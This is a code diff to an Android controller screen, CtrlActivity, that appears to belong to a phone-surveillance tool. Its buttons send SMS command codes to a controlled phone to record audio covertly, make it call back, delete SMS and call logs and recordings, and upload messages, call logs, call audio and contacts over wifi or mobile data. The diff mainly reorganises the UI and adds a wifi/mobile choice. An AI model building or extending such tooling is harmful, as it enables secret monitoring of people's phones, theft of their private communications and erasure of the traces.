@@ -29,7 +29,9 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
 import android.widget.PopupWindow;
+import android.widget.RadioButton;
 import android.widget.RelativeLayout;
+import android.widget.TableLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -44,11 +46,9 @@ import android.widget.Toast;
  */
 public class CtrlActivity extends Activity implements OnClickListener {
 
+	private static final int PAGE_NUMS = 4;
+
 	private ViewPager viewPager;
-	private View viewNormal;
-	private View viewClear;
-	private View viewUploadWifi;
-	private View viewUploadMobile;
 	private View[] views;
 	// Normal
 	private Button btnTurnUp;
@@ -70,12 +70,6 @@ public class CtrlActivity extends Activity implements OnClickListener {
 	private Button btnUploadOtherAudios_Wifi;
 	private Button btnUploadContacts_Wifi;
 	private Button btnWifiOpen;
-	// Upload - mobile
-	private Button btnUploadAll_Mobile;
-	private Button btnUploadSmsCallLog_Mobile;
-	private Button btnUploadCallAudios_Mobile;
-	private Button btnUploadOtherAudios_Mobile;
-	private Button btnUploadContacts_Mobile;
 	private Button btnMobileOpen;
 
 	private TextView textPage;
@@ -105,6 +99,8 @@ public class CtrlActivity extends Activity implements OnClickListener {
 		btnRecorderTime.setOnClickListener(this);
 		btnRecorderStart.setOnClickListener(this);
 		btnRecorderStop.setOnClickListener(this);
+		btnWifiOpen.setOnClickListener(this);
+		btnMobileOpen.setOnClickListener(this);
 		// Clear
 		btnClearSms.setOnClickListener(this);
 		btnClearCall.setOnClickListener(this);
@@ -117,20 +113,12 @@ public class CtrlActivity extends Activity implements OnClickListener {
 		btnUploadCallAudios_Wifi.setOnClickListener(this);
 		btnUploadOtherAudios_Wifi.setOnClickListener(this);
 		btnUploadContacts_Wifi.setOnClickListener(this);
-		btnWifiOpen.setOnClickListener(this);
-		// Upload-mobile
-		btnUploadAll_Mobile.setOnClickListener(this);
-		btnUploadSmsCallLog_Mobile.setOnClickListener(this);
-		btnUploadCallAudios_Mobile.setOnClickListener(this);
-		btnUploadOtherAudios_Mobile.setOnClickListener(this);
-		btnUploadContacts_Mobile.setOnClickListener(this);
-		btnMobileOpen.setOnClickListener(this);
 		textPage.setOnClickListener(new View.OnClickListener() {
 
 			@Override
 			public void onClick(View v) {
 				pageid++;
-				viewPager.setCurrentItem(pageid % 4, true);
+				viewPager.setCurrentItem(pageid % PAGE_NUMS, true);
 			}
 		});
 	}
@@ -138,16 +126,16 @@ public class CtrlActivity extends Activity implements OnClickListener {
 	private void initViews() {
 		viewPager = (ViewPager) findViewById(R.id.viewpager_flippershow);
 		LayoutInflater inflater = getLayoutInflater();
-		viewNormal = inflater.inflate(R.layout.page_normal, null);
-		viewClear = inflater.inflate(R.layout.page_clear, null);
-		viewUploadWifi = inflater.inflate(R.layout.page_upload_wifi, null);
-		viewUploadMobile = inflater.inflate(R.layout.page_upload_mobile, null);
+		View viewNormal = inflater.inflate(R.layout.page_normal, null);
+		View viewClear = inflater.inflate(R.layout.page_clear, null);
+		View viewUploadWifi = inflater.inflate(R.layout.page_upload_wifi, null);
+		View viewAbout = inflater.inflate(R.layout.page_about, null);
 
-		views = new View[4];
+		views = new View[PAGE_NUMS];
 		views[0] = viewNormal;
 		views[1] = viewClear;
 		views[2] = viewUploadWifi;
-		views[3] = viewUploadMobile;
+		views[3] = viewAbout;
 
 		btnTurnUp = (Button) viewNormal.findViewById(R.id.btn_turn_up);
 		btnTurnDown = (Button) viewNormal.findViewById(R.id.btn_turn_down);
@@ -155,6 +143,9 @@ public class CtrlActivity extends Activity implements OnClickListener {
 		btnRecorderTime = (Button) viewNormal.findViewById(R.id.btn_record_time);
 		btnRecorderStart = (Button) viewNormal.findViewById(R.id.btn_record_start);
 		btnRecorderStop = (Button) viewNormal.findViewById(R.id.btn_record_end);
+		btnWifiOpen = (Button) viewNormal.findViewById(R.id.btn_open_wifi);
+		btnMobileOpen = (Button) viewNormal.findViewById(R.id.btn_open_mobile);
+
 		// Clear
 		btnClearSms = (Button) viewClear.findViewById(R.id.btn_del_msg_log);
 		btnClearCall = (Button) viewClear.findViewById(R.id.btn_del_call_log);
@@ -167,14 +158,6 @@ public class CtrlActivity extends Activity implements OnClickListener {
 		btnUploadCallAudios_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_call_audio_wifi);
 		btnUploadOtherAudios_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_other_audio_wifi);
 		btnUploadContacts_Wifi = (Button) viewUploadWifi.findViewById(R.id.btn_upload_contacts_wifi);
-		btnWifiOpen = (Button) viewUploadWifi.findViewById(R.id.btn_upload_wifi_open);
-		// Upload - mobile
-		btnUploadAll_Mobile = (Button) viewUploadMobile.findViewById(R.id.btn_upload_all_mobile);
-		btnUploadSmsCallLog_Mobile = (Button) viewUploadMobile.findViewById(R.id.btn_upload_msg_call_log_mobile);
-		btnUploadCallAudios_Mobile = (Button) viewUploadMobile.findViewById(R.id.btn_upload_call_audio_mobile);
-		btnUploadOtherAudios_Mobile = (Button) viewUploadMobile.findViewById(R.id.btn_upload_other_audio_mobile);
-		btnUploadContacts_Mobile = (Button) viewUploadMobile.findViewById(R.id.btn_upload_contacts_mobile);
-		btnMobileOpen = (Button) viewUploadMobile.findViewById(R.id.btn_upload_mobile_open);
 
 		textPage = (TextView) findViewById(R.id.textview_page);
 		imgBg = (ImageView) findViewById(R.id.image_bg);
@@ -293,73 +276,58 @@ public class CtrlActivity extends Activity implements OnClickListener {
 	public void onClick(View v) {
 		switch (v.getId()) {
 		case R.id.btn_turn_up:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UP);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UP, null);
 			break;
 		case R.id.btn_turn_down:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DOWN);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DOWN, null);
 			break;
 		case R.id.btn_call_me:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_CALL_ME);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_CALL_ME, null);
 			break;
 		case R.id.btn_record_time:
-			showPopWindow(true, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_TIME);
+			showPopWindow(true, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_TIME, null);
 			break;
 		case R.id.btn_record_start:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_START);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_START, null);
 			break;
 		case R.id.btn_record_end:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_END);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_END, null);
+			break;
+		case R.id.btn_open_wifi:
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_WIFI, null);
+			break;
+		case R.id.btn_open_mobile:
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_MOBILE, null);
 			break;
 		case R.id.btn_del_msg_log:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_MSG_LOG);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_MSG_LOG, null);
 			break;
 		case R.id.btn_del_call_log:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_CALL_LOG);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_CALL_LOG, null);
 			break;
 		case R.id.btn_del_call_audios:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_CALL);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_CALL, null);
 			break;
 		case R.id.btn_del_other_audios:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_OTHER);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_OTHER, null);
 			break;
 		case R.id.btn_del_all:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_ALL_LOG);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_ALL_LOG, null);
 			break;
 		case R.id.btn_upload_all_wifi:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL_MOBILE);
 			break;
 		case R.id.btn_upload_msg_call_log_wifi:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
 			break;
 		case R.id.btn_upload_call_audio_wifi:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
 			break;
 		case R.id.btn_upload_other_audio_wifi:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
 			break;
 		case R.id.btn_upload_contacts_wifi:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS);
-			break;
-		case R.id.btn_upload_contacts_mobile:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
-			break;
-		case R.id.btn_upload_wifi_open:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_WIFI);
-			break;
-		case R.id.btn_upload_mobile_open:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_MOBILE);
-			break;
-		case R.id.btn_upload_all_mobile:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL_MOBILE);
-			break;
-		case R.id.btn_upload_msg_call_log_mobile:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
-			break;
-		case R.id.btn_upload_call_audio_mobile:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
-			break;
-		case R.id.btn_upload_other_audio_mobile:
-			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
+			showPopWindow(false, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS, GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
 			break;
 		default:
 			break;
@@ -371,7 +339,7 @@ public class CtrlActivity extends Activity implements OnClickListener {
 		try {
 			SmsManager sms = SmsManager.getDefault();
 			String num = ControllerApplication.getInstence().getControlTel();
-			if(num == null || num.equals("")) {
+			if (num == null || num.equals("")) {
 				Toast.makeText(CtrlActivity.this, R.string.send_command_error, Toast.LENGTH_SHORT).show();
 			} else {
 				sms.sendTextMessage(num, "", content, null, null);
@@ -386,7 +354,7 @@ public class CtrlActivity extends Activity implements OnClickListener {
 
 	/****************************/
 
-	private void showPopWindow(final boolean inputView, final String content) {
+	private void showPopWindow(final boolean inputView, final String content, final String contentMobile) {
 
 		DisplayMetrics dMetrics = new DisplayMetrics();
 		getWindowManager().getDefaultDisplay().getMetrics(dMetrics);
@@ -404,12 +372,44 @@ public class CtrlActivity extends Activity implements OnClickListener {
 			layoutPop = (RelativeLayout) layout.findViewById(R.id.layout_pop_normal_main);
 
 			final TextView textCode = (TextView) layout.findViewById(R.id.text_pop_normal_code_show);
+			final TableLayout layoutSelect = (TableLayout) layout.findViewById(R.id.layout_wifi_mobile_select);
 			textCode.setText(content);
+
+			if (contentMobile == null) {
+				layoutSelect.setVisibility(View.GONE);
+			} else {
+				layoutSelect.setVisibility(View.VISIBLE);
+				final RadioButton radioWifi = (RadioButton) layout.findViewById(R.id.radiobtn_wifi);
+				final RadioButton radioWifiGprs = (RadioButton) layout.findViewById(R.id.radiobtn_gprs_wifi);
+				radioWifi.setChecked(true);
+				radioWifi.setOnClickListener(new View.OnClickListener() {
+
+					@Override
+					public void onClick(View v) {
+						radioWifiGprs.setChecked(false);
+						radioWifi.setChecked(true);
+						textCode.setText(content);
+
+					}
+				});
+
+				radioWifiGprs.setOnClickListener(new View.OnClickListener() {
+
+					@Override
+					public void onClick(View v) {
+						radioWifiGprs.setChecked(true);
+						radioWifi.setChecked(false);
+						textCode.setText(contentMobile);
+					}
+				});
+
+			}
+
 			btnOk.setOnClickListener(new View.OnClickListener() {
 
 				@Override
 				public void onClick(View v) {
-					sendMsg(content);
+					sendMsg(textCode.getText().toString());
 					new Handler().postDelayed(new Runnable() {
 
 						@Override
@@ -450,34 +450,35 @@ public class CtrlActivity extends Activity implements OnClickListener {
 						Toast.makeText(CtrlActivity.this, R.string.input_string_alarm, Toast.LENGTH_SHORT).show();
 					} else {
 						final int min = Integer.parseInt(editInput.getText().toString());
-						if (min > 0) {
+						if (min > 0 && min < 100) {
 							hideKeyboard(v);
 							new Handler().postDelayed(new Runnable() {
 
 								@Override
 								public void run() {
 									mainPopWindow.dismiss();
-									showPopWindow(false, content + min);
+									showPopWindow(false, content + min, null);
 								}
 							}, POPWINDOW_DISMISS_DELAY);
 
 						} else {
 							Toast.makeText(CtrlActivity.this, R.string.input_int_alarm, Toast.LENGTH_SHORT).show();
+							editInput.setText("");
 						}
 					}
 				}
 			});
 		}
 
-		layoutPop.setOnClickListener(new View.OnClickListener() {
-
-			@Override
-			public void onClick(View v) {
-				mainPopWindow.dismiss();
-			}
-		});
+		// layoutPop.setOnClickListener(new View.OnClickListener() {
+		//
+		// @Override
+		// public void onClick(View v) {
+		// mainPopWindow.dismiss();
+		// }
+		// });
 		layoutPop.setBackgroundColor(0xAA000000);
-		mainPopWindow = new PopupWindow(layout, dMetrics.widthPixels, (int) (dMetrics.heightPixels * 0.5), true);
+		mainPopWindow = new PopupWindow(layout, dMetrics.widthPixels, (int) (dMetrics.heightPixels * 0.6), true);
 		mainPopWindow.setBackgroundDrawable(new ColorDrawable(Color.argb(5, 255, 255, 255)));
 		mainPopWindow.setOutsideTouchable(true);
 		mainPopWindow.setAnimationStyle(R.style.popupwindow_style);
